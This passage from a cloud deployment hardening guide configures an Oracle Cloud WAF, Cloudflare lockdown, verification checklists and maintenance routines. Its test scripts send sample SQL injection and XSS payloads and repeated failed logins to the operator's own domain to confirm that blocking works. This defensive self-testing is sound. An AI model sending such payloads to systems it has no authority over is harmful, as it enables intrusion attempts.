        "actionName": "blockAction",
        "condition": "http.request.url.path == \"/api/auth/register\"",
        "conditionLanguage": "JMESPATH",
        "configurations": [
          {
            "periodInSeconds": 3600,
            "requestsLimit": 10,
            "actionDurationInSeconds": 3600
          }
        ]
      },
      {
        "name": "rate-limit-global",
        "type": "REQUEST_RATE_LIMITING",
        "actionName": "blockAction",
        "condition": "http.request.url.path starts_with \"/api/\"",
        "conditionLanguage": "JMESPATH",
        "configurations": [
          {
            "periodInSeconds": 60,
            "requestsLimit": 100,
            "actionDurationInSeconds": 60
          }
        ]
      }
    ]
  }' \
  --request-protection '{
    "rules": [
      {
        "name": "sql-injection-protection",
        "type": "PROTECTION",
        "actionName": "blockAction",
        "protectionCapabilities": [
          {"key": "942100", "version": 1},
          {"key": "942110", "version": 1},
          {"key": "942120", "version": 1},
          {"key": "942130", "version": 1},
          {"key": "942140", "version": 1},
          {"key": "942150", "version": 1},
          {"key": "942160", "version": 1}
        ]
      },
      {
        "name": "xss-protection",
        "type": "PROTECTION",
        "actionName": "blockAction",
        "protectionCapabilities": [
          {"key": "941100", "version": 1},
          {"key": "941110", "version": 1},
          {"key": "941120", "version": 1},
          {"key": "941130", "version": 1}
        ]
      },
      {
        "name": "lfi-protection",
        "type": "PROTECTION",
        "actionName": "blockAction",
        "protectionCapabilities": [
          {"key": "930100", "version": 1},
          {"key": "930110", "version": 1},
          {"key": "930120", "version": 1}
        ]
      }
    ]
  }' \
  --query 'data.id' \
  --raw-output)

echo "WAF_POLICY_ID=$WAF_POLICY_ID" >> ~/oci-config.env
echo "Created WAF Policy: $WAF_POLICY_ID"
```

### Step 7.2: Create WAF and Attach to Load Balancer

```bash
# If using OCI Load Balancer:
WAF_ID=$(oci waf web-app-firewall create \
  --compartment-id $COMPARTMENT_ID \
  --display-name "webapp-waf" \
  --backend-type "LOAD_BALANCER" \
  --load-balancer-id $OCI_LB_ID \
  --web-app-firewall-policy-id $WAF_POLICY_ID \
  --query 'data.id' \
  --raw-output)

echo "WAF_ID=$WAF_ID" >> ~/oci-config.env
```

**Alternative: Use Cloudflare in front (Free tier available)**

If you want a CDN + WAF without OCI costs:

1. Point DNS to Cloudflare
2. Configure Cloudflare origin to your Nginx LB public IP
3. Enable Cloudflare WAF rules (OWASP)
4. Lock down Nginx to only accept Cloudflare IPs:

```bash
# On Nginx LB
sudo tee /etc/nginx/conf.d/cloudflare-ips.conf << 'EOF'
# Cloudflare IP ranges (update periodically)
set_real_ip_from 103.21.244.0/22;
set_real_ip_from 103.22.200.0/22;
set_real_ip_from 103.31.4.0/22;
set_real_ip_from 104.16.0.0/13;
set_real_ip_from 104.24.0.0/14;
set_real_ip_from 108.162.192.0/18;
set_real_ip_from 131.0.72.0/22;
set_real_ip_from 141.101.64.0/18;
set_real_ip_from 162.158.0.0/15;
set_real_ip_from 172.64.0.0/13;
set_real_ip_from 173.245.48.0/20;
set_real_ip_from 188.114.96.0/20;
set_real_ip_from 190.93.240.0/20;
set_real_ip_from 197.234.240.0/22;
set_real_ip_from 198.41.128.0/17;
real_ip_header CF-Connecting-IP;
EOF

# Update NSG to only allow Cloudflare IPs on port 443
# (This requires multiple rules for each CIDR range)
```

---

## Application Code Implementation

### Complete Project Structure

```
webapp/
├── package.json
├── server.js              # Main application (see Phase 3)
├── .env                   # Environment variables (never commit)
├── .env.example           # Template for env vars
├── config/
│   └── index.js           # Configuration loader
├── middleware/
│   ├── authenticate.js    # JWT validation
│   ├── authorize.js       # Object-level authorization
│   ├── validate.js        # Input validation
│   └── rateLimiter.js     # Rate limiting
├── routes/
│   ├── auth.js            # Auth routes
│   ├── users.js           # User routes
│   └── orders.js          # Order routes
├── models/
│   └── db.js              # Database connection
├── migrations/
│   └── 001_initial.sql    # Database schema
└── tests/
    └── api.test.js        # API tests
```

### Environment Variables Template

**.env.example**
```bash
# Server
PORT=3000
NODE_ENV=production

# Security
JWT_SECRET=generate-a-strong-secret-here
JWT_EXPIRY=1h

# Database (Layer 5)
DB_HOST=10.0.3.x
DB_PORT=5432
DB_NAME=webapp_db
DB_USER=app_user
DB_PASSWORD=strong-password-here
DB_POOL_SIZE=20

# Proxy (Layer 2)
TRUSTED_PROXIES=1

# Rate Limiting (Layer 4)
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX=100
AUTH_RATE_LIMIT_MAX=5
```

---

## Verification & Testing

### Layer-by-Layer Verification Checklist

```bash
# ============================================
# LAYER 6: Network Verification
# ============================================
echo "=== Layer 6: Network ==="

# Check VCN
oci network vcn get --vcn-id $VCN_ID --query 'data."lifecycle-state"'

# Check subnet isolation
oci network subnet get --subnet-id $PRIVATE_DB_SUBNET_ID --query 'data."prohibit-public-ip-on-vnic"'
# Should return: true

# Check NSG rules
oci network nsg rules list --nsg-id $NSG_DB_ID --query 'data[*].{Direction:direction,Source:source,Port:"tcp-options"."destination-port-range"}'

# ============================================
# LAYER 5: Database Verification
# ============================================
echo "=== Layer 5: Database ==="

# From app server (via bastion)
ssh app-server
psql -h $DB_PRIVATE_IP -U app_user -d webapp_db -c "SELECT 1;"
# Should succeed

# From outside (should fail)
psql -h $DB_PRIVATE_IP -U app_user -d webapp_db -c "SELECT 1;"
# Should timeout/fail

# ============================================
# LAYER 4: Application Verification
# ============================================
echo "=== Layer 4: Application ==="

# Check app is running
ssh app-server "pm2 status"

# Check health endpoint
curl -s http://localhost:3000/health

# Test input validation (should return 400)
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email": "invalid", "password": "weak"}'

# ============================================
# LAYER 2: Load Balancer Verification
# ============================================
echo "=== Layer 2: Load Balancer ==="

# Check TLS certificate
echo | openssl s_client -connect api.yourdomain.com:443 2>/dev/null | openssl x509 -noout -dates

# Check HTTPS redirect
curl -I http://api.yourdomain.com
# Should return 301 redirect to HTTPS

# Check rate limiting headers
curl -I https://api.yourdomain.com/health

# ============================================
# LAYER 1: WAF Verification
# ============================================
echo "=== Layer 1: WAF ==="

# Test SQL injection (should be blocked)
curl "https://api.yourdomain.com/api/users?id=1'%20OR%201=1--"
# Should return 403

# Test XSS (should be blocked)
curl "https://api.yourdomain.com/api/search?q=<script>alert(1)</script>"
# Should return 403

# Test rate limiting (should be blocked after threshold)
for i in {1..10}; do
  curl -X POST https://api.yourdomain.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}'
done
# Should start getting 429 after 5 attempts
```

### Security Testing Script

```bash
#!/bin/bash
# security-test.sh

BASE_URL="https://api.yourdomain.com"

echo "=== Security Test Suite ==="

# 1. TLS Configuration
echo -e "\n[1] TLS Configuration"
nmap --script ssl-enum-ciphers -p 443 api.yourdomain.com | grep -E "TLSv|ciphers"

# 2. Security Headers
echo -e "\n[2] Security Headers"
curl -sI $BASE_URL | grep -iE "strict-transport|x-frame|x-content-type|x-xss|referrer-policy"

# 3. Rate Limiting
echo -e "\n[3] Rate Limiting Test"
for i in {1..7}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST $BASE_URL/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}')
  echo "Attempt $i: HTTP $response"
done

# 4. Input Validation
echo -e "\n[4] Input Validation Test"
echo "Testing invalid email..."
curl -s -X POST $BASE_URL/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"notanemail","password":"Test123!@#","name":"Test"}'

# 5. SQL Injection Test
echo -e "\n[5] SQL Injection Test"
curl -s "$BASE_URL/api/users?id=1'%20OR%201=1--"

# 6. XSS Test
echo -e "\n[6] XSS Test"
curl -s "$BASE_URL/api/search?q=%3Cscript%3Ealert(1)%3C/script%3E"

echo -e "\n=== Tests Complete ==="
```

---

## Maintenance & Operations

### Daily Operations

```bash
# Check service health
pm2 status                           # App status
sudo systemctl status nginx          # LB status
sudo systemctl status postgresql     # DB status

# View logs
pm2 logs webapp --lines 100          # App logs
sudo tail -f /var/log/nginx/error.log # Nginx errors
sudo tail -f /var/log/postgresql/*.log # DB logs

# Check certificate expiry
sudo certbot certificates
```

### Weekly Tasks

```bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Check certificate renewal
sudo certbot renew --dry-run

# Review WAF blocks
oci waf work-request list --compartment-id $COMPARTMENT_ID

# Check failed login attempts
sudo grep "Invalid credentials" /var/log/webapp/app.log | wc -l

# Database backup verification
pg_dump -h localhost -U migration_user webapp_db > /tmp/backup-test.sql
ls -la /tmp/backup-test.sql
rm /tmp/backup-test.sql
```

### Monthly Tasks

```bash
# Rotate secrets
# 1. Generate new JWT secret
NEW_JWT_SECRET=$(openssl rand -base64 32)

# 2. Update app .env
# 3. Restart app with grace period
pm2 reload webapp

# Review and update NSG rules
oci network nsg rules list --nsg-id $NSG_APP_ID

# Review database user privileges
sudo -u postgres psql -c "\du"

# Update WAF rules if needed
oci waf web-app-firewall-policy get --web-app-firewall-policy-id $WAF_POLICY_ID

# Test disaster recovery
# 1. Restore from backup to test environment
# 2. Verify application works
# 3. Document recovery time
```

### Incident Response Checklist

```markdown
## Security Incident Response

### 1. Detection
- [ ] Identify the incident type (breach, DDoS, malware)
- [ ] Determine scope and affected systems
- [ ] Preserve logs and evidence

### 2. Containment
- [ ] Isolate affected systems (update NSG rules)
- [ ] Block malicious IPs at WAF/LB
- [ ] Revoke compromised credentials

### 3. Investigation
- [ ] Review application logs
- [ ] Review WAF/LB logs
- [ ] Review database audit logs
- [ ] Check for lateral movement

### 4. Recovery
- [ ] Restore from clean backup if needed
- [ ] Deploy patched application
- [ ] Reset all credentials
- [ ] Update security rules

### 5. Post-Incident
- [ ] Document incident timeline
- [ ] Identify root cause
- [ ] Update security controls
- [ ] Conduct lessons learned
```

---

## Quick Reference: Port Matrix

| Source | Destination | Port | Protocol | Purpose |
|--------|-------------|------|----------|---------|
| Internet | NSG-LB | 443 | TCP | HTTPS |
| Internet | NSG-LB | 80 | TCP | HTTP→HTTPS redirect |
| Your IP | NSG-Bastion | 22 | TCP | SSH admin |
| NSG-LB | NSG-APP | 3000 | TCP | App traffic |
| NSG-Bastion | NSG-APP | 22 | TCP | SSH to app |
| NSG-APP | NSG-DB | 5432 | TCP | PostgreSQL |
| NSG-Bastion | NSG-DB | 22 | TCP | SSH to DB |
| NSG-APP | Internet | 443 | TCP | External APIs |

---

## Quick Reference: All OCIDs

After setup, your `~/oci-config.env` should contain:

```bash
# Core
COMPARTMENT_ID=ocid1.compartment...
TENANCY_ID=ocid1.tenancy...
REGION=us-ashburn-1

# Network (Layer 6)
VCN_ID=ocid1.vcn...
PUBLIC_SUBNET_ID=ocid1.subnet...
PRIVATE_APP_SUBNET_ID=ocid1.subnet...
PRIVATE_DB_SUBNET_ID=ocid1.subnet...
IGW_ID=ocid1.internetgateway...
NAT_ID=ocid1.natgateway...

# NSGs
NSG_LB_ID=ocid1.networksecuritygroup...
NSG_APP_ID=ocid1.networksecuritygroup...
NSG_DB_ID=ocid1.networksecuritygroup...
NSG_BASTION_ID=ocid1.networksecuritygroup...

# Compute
LB_INSTANCE_ID=ocid1.instance...
APP_INSTANCE_ID=ocid1.instance...
DB_INSTANCE_ID=ocid1.instance...
BASTION_INSTANCE_ID=ocid1.instance...

# IPs
LB_PUBLIC_IP=x.x.x.x
APP_PRIVATE_IP=10.0.2.x
DB_PRIVATE_IP=10.0.3.x
BASTION_PUBLIC_IP=x.x.x.x

# WAF
WAF_POLICY_ID=ocid1.webappfirewallpolicy...
WAF_ID=ocid1.webappfirewall...

# API Gateway (if used)
APIGW_ID=ocid1.apigateway...
```

---

## Summary: What Each Layer Protects Against

| Layer | Component | Protects Against |
|-------|-----------|------------------|
| 1 | WAF/CDN | DDoS, OWASP Top 10, bots, scanners |
| 2 | Load Balancer | TLS attacks, slowloris, large payloads |
| 3 | API Gateway | Auth bypass, quota abuse, noisy neighbors |
| 4 | Application | Injection, IDOR/BOLA, broken auth, logic flaws |
| 5 | Database | Data breach, privilege escalation, data loss |
| 6 | Network | Lateral movement, direct attacks, data exfil |

Each layer adds defense-in-depth. If one fails, the next catches the attack.

---

**Document Version:** 1.0  
**Last Updated:** January 2026  
**Author:** Claude (Anthropic)